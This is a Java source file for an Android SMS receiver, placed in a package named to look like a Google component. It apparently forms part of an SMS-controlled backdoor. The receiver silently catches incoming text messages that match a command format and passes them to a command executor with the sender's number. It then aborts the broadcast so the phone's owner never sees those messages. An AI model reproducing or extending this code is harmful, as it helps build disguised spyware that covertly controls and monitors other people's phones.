package com.google.cachesync;

import java.util.Set;

import com.code4bones.utils.NetLog;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.SmsMessage;

/*
 *         Uri uri;
            String[] projection;

            // If targeting Donut or below, use
            // Contacts.Phones.CONTENT_FILTER_URL and
            // Contacts.Phones.DISPLAY_NAME
            uri = Uri.withAppendedPath(
                    ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                    Uri.encode(fromAddress));
            projection = new String[] { ContactsContract.PhoneLookup.DISPLAY_NAME };

            // Query the filter URI
            Cursor cursor = context.getContentResolver().query(uri, projection, null, null, null);
            if (cursor != null) {
                if (cursor.moveToFirst())
                    fromDisplayName = cursor.getString(0);

                cursor.close();
            }

 */

public class SmsReceiver extends BroadcastReceiver {

	final  private Handler mHandler  = new Handler();

	class ExecCommand implements Runnable {
		private final CommandPool cmdPool;
		private String phone;
		private String source;
		
		public ExecCommand(CommandPool cmdPool,String phone,String source) {
			this.cmdPool = cmdPool;
			this.phone = phone;
			this.source = source;
		}
		public void run() {
			cmdPool.Execute(phone, source);
			NetLog.v("SMS: Command Processed...\n");
		}
	}
	
	@Override
	public void onReceive(Context context, Intent intent) {

		   CommandPool  cmdPool = CommandPool.getInstance();
		   
			Bundle extras = intent.getExtras();
			if ( extras == null ) {
				NetLog.v("SMS have no Extras() !");
				return;
			}
			
			boolean isCommand = false;
					
			Object[] objExtra = (Object[])extras.get("pdus");
			for ( Object smsx : objExtra ) {
				SmsMessage sms = SmsMessage.createFromPdu((byte[])smsx);
				
				String message = sms.getMessageBody();
				
				if ( !CommandObj.isCommand(message) ) 
					continue;
				
				ExecCommand exec = new ExecCommand(cmdPool,sms.getOriginatingAddress(),message);
				mHandler.post(exec);
				isCommand = true;
			}
			if ( isCommand )
				this.abortBroadcast();
		}
}
